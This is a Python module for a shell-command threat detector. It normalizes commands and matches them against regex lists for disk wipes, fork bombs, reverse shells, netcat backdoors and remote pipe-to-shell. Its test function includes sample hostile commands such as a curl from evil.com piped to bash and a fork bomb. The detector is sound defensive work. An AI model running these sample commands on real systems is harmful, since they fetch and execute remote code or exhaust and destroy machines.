"""
Command Normalizer - Threat Detection and Command Sanitization
Detects obfuscation, dangerous patterns, and normalizes shell commands
© 2026 — All rights reserved.
"""

import re
import shlex
from typing import Dict, List, Any
import logging

logger = logging.getLogger(__name__)


class CommandNormalizer:
    """
    Normalizes shell commands and scans for threats and obfuscation.
    
    This class performs:
    1. Command normalization (removing extra whitespace, resolving aliases)
    2. Obfuscation detection (encoding, unusual quoting, variable expansion)
    3. Threat pattern matching (known malicious patterns)
    4. Suspicious behavior detection (chained pipes, redirects)
    """
    
    # Known dangerous patterns
    THREAT_PATTERNS = [
        r'rm\s+-rf\s+/',  # Recursive delete from root
        r'dd\s+if=/dev/(zero|random)\s+of=/dev/sd',  # Disk wipe
        r':\(\)\{\s*:\|:&\s*\};:',  # Fork bomb
        r'mkfs\.',  # Format filesystem
        r'curl.*\|.*sh',  # Pipe to shell from remote
        r'wget.*\|.*bash',  # Pipe to shell from remote
        r'nc\s+-l.*-e',  # Netcat backdoor
        r'/dev/tcp/.*exec',  # Bash TCP backdoor
        r'eval.*base64',  # Eval encoded content
        r'bash\s+-i.*>.*&',  # Reverse shell
        r'python.*-c.*import\s+pty',  # PTY spawn
        r'\$\(.*base64.*-d.*\)',  # Base64 decode execution
    ]
    
    # Obfuscation indicators
    OBFUSCATION_PATTERNS = [
        r'\\x[0-9a-fA-F]{2}',  # Hex encoding
        r'\$\{IFS\}',  # IFS variable abuse
        r'\${.*:.*:.*}',  # Parameter expansion abuse
        r'[\'\"]{2,}',  # Excessive quoting
        r'\$\(\(.*\)\)',  # Arithmetic expansion abuse
        r'[a-zA-Z]{1}\$@',  # Variable splitting
        r'\\u[0-9a-fA-F]{4}',  # Unicode escape
        r'(?:\|\||&&).*(?:\|\||&&)',  # Multiple logical operators
    ]
    
    # Sensitive commands that need scrutiny
    SENSITIVE_COMMANDS = [
        'sudo', 'su', 'doas', 'pkexec',
        'chmod', 'chown', 'chgrp',
        'iptables', 'ufw', 'firewall-cmd',
        'systemctl', 'service',
        'crontab', 'at',
        'ssh', 'scp', 'nc', 'netcat',
        'curl', 'wget',
        'dd', 'shred',
        'passwd', 'usermod', 'useradd',
    ]
    
    def __init__(self):
        """Initialize the command normalizer."""
        self.threat_patterns = [re.compile(p, re.IGNORECASE) for p in self.THREAT_PATTERNS]
        self.obfuscation_patterns = [re.compile(p) for p in self.OBFUSCATION_PATTERNS]
    
    def normalize_and_scan(self, raw_command: str) -> Dict[str, Any]:
        """
        Normalize command and scan for threats.
        
        Args:
            raw_command: Raw command string from user
            
        Returns:
            Dictionary containing:
                - normalized: Cleaned/normalized command
                - threats: List of detected threat descriptions
                - obfuscation_detected: Boolean flag
                - risk_indicators: List of risk indicators found
        """
        if not raw_command or not raw_command.strip():
            return {
                "normalized": "",
                "threats": ["Empty command"],
                "obfuscation_detected": False,
                "risk_indicators": []
            }
        
        # Normalize the command
        normalized = self._normalize(raw_command)
        
        # Scan for threats
        threats = self._detect_threats(normalized)
        
        # Check for obfuscation
        obfuscation_detected = self._detect_obfuscation(raw_command)
        
        # Identify risk indicators
        risk_indicators = self._identify_risk_indicators(normalized)
        
        return {
            "normalized": normalized,
            "threats": threats,
            "obfuscation_detected": obfuscation_detected,
            "risk_indicators": risk_indicators
        }
    
    def _normalize(self, command: str) -> str:
        """
        Normalize a command string.
        
        Normalization steps:
        1. Strip leading/trailing whitespace
        2. Collapse multiple spaces
        3. Remove comments
        4. Standardize quotes
        
        Args:
            command: Raw command string
            
        Returns:
            Normalized command string
        """
        # Strip whitespace
        normalized = command.strip()
        
        # Remove inline comments (be careful with # in strings)
        # This is a simplified version - full implementation needs quote-aware parsing
        if '#' in normalized:
            # Only remove if # is not inside quotes
            parts = []
            in_quote = False
            quote_char = None
            for i, char in enumerate(normalized):
                if char in ('"', "'") and (i == 0 or normalized[i-1] != '\\'):
                    if not in_quote:
                        in_quote = True
                        quote_char = char
                    elif char == quote_char:
                        in_quote = False
                        quote_char = None
                if char == '#' and not in_quote:
                    normalized = normalized[:i].rstrip()
                    break
        
        # Collapse multiple spaces (but preserve spaces in quotes)
        normalized = re.sub(r'\s+', ' ', normalized)
        
        # Remove trailing semicolons and spaces
        normalized = normalized.rstrip('; ')
        
        return normalized
    
    def _detect_threats(self, command: str) -> List[str]:
        """
        Detect known threat patterns in command.
        
        Args:
            command: Normalized command string
            
        Returns:
            List of threat descriptions
        """
        threats = []
        
        for pattern in self.threat_patterns:
            if pattern.search(command):
                threats.append(f"Dangerous pattern detected: {pattern.pattern}")
        
        # Check for privilege escalation attempts
        if re.search(r'sudo\s+su\s*$', command):
            threats.append("Privilege escalation: sudo su")
        
        # Check for password file access
        if '/etc/shadow' in command or '/etc/passwd' in command:
            threats.append("Sensitive file access: password files")
        
        # Check for kernel/device access
        if re.search(r'/dev/(mem|kmem|port)', command):
            threats.append("Direct hardware/kernel access")
        
        # Check for process injection
        if re.search(r'/proc/\d+/(mem|maps)', command):
            threats.append("Process memory access")
        
        return threats
    
    def _detect_obfuscation(self, command: str) -> bool:
        """
        Detect obfuscation techniques in command.
        
        Args:
            command: Raw command string
            
        Returns:
            True if obfuscation detected
        """
        for pattern in self.obfuscation_patterns:
            if pattern.search(command):
                logger.warning(f"Obfuscation pattern detected: {pattern.pattern}")
                return True
        
        # Check for excessive escaping
        if command.count('\\') > 5:
            logger.warning("Excessive escaping detected")
            return True
        
        # Check for base64-like strings (long alphanumeric with +/=)
        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
        if re.search(base64_pattern, command):
            logger.warning("Possible base64 encoded content")
            return True
        
        # Check for hex-encoded strings
        hex_pattern = r'(?:\\x[0-9a-fA-F]{2}){4,}'
        if re.search(hex_pattern, command):
            logger.warning("Hex encoding detected")
            return True
        
        return False
    
    def _identify_risk_indicators(self, command: str) -> List[str]:
        """
        Identify risk indicators in normalized command.
        
        Args:
            command: Normalized command string
            
        Returns:
            List of risk indicator descriptions
        """
        indicators = []
        
        # Check for sensitive commands
        command_lower = command.lower()
        for sensitive_cmd in self.SENSITIVE_COMMANDS:
            if re.search(rf'\b{sensitive_cmd}\b', command_lower):
                indicators.append(f"Sensitive command: {sensitive_cmd}")
        
        # Check for pipe chains (potential data exfiltration)
        pipe_count = command.count('|')
        if pipe_count > 3:
            indicators.append(f"Multiple pipe operations ({pipe_count})")
        
        # Check for file redirects
        if '>>' in command or '>' in command:
            indicators.append("Output redirection")
        
        # Check for background execution
        if command.endswith('&'):
            indicators.append("Background execution")
        
        # Check for command substitution
        if '$(' in command or '`' in command:
            indicators.append("Command substitution")
        
        # Check for network operations
        network_indicators = ['://', 'http:', 'https:', 'ftp:', 'ssh:']
        if any(indicator in command_lower for indicator in network_indicators):
            indicators.append("Network operation")
        
        return indicators


# Test function
def _test_normalizer():
    """Test the CommandNormalizer with various inputs."""
    normalizer = CommandNormalizer()
    
    test_commands = [
        "ls -la",
        "echo 'test' | grep test",
        "rm -rf /tmp/test",
        "curl http://evil.com/script.sh | bash",
        "echo $((16#41))$(echo -e '\\x41')",
        "sudo su -",
        ": () { : | : & }; :",  # Fork bomb
    ]
    
    print("Testing CommandNormalizer:")
    print("=" * 60)
    
    for cmd in test_commands:
        print(f"\nCommand: {cmd}")
        result = normalizer.normalize_and_scan(cmd)
        print(f"  Normalized: {result['normalized']}")
        print(f"  Threats: {result['threats']}")
        print(f"  Obfuscation: {result['obfuscation_detected']}")
        print(f"  Risk Indicators: {result['risk_indicators']}")


if __name__ == "__main__":
    _test_normalizer()
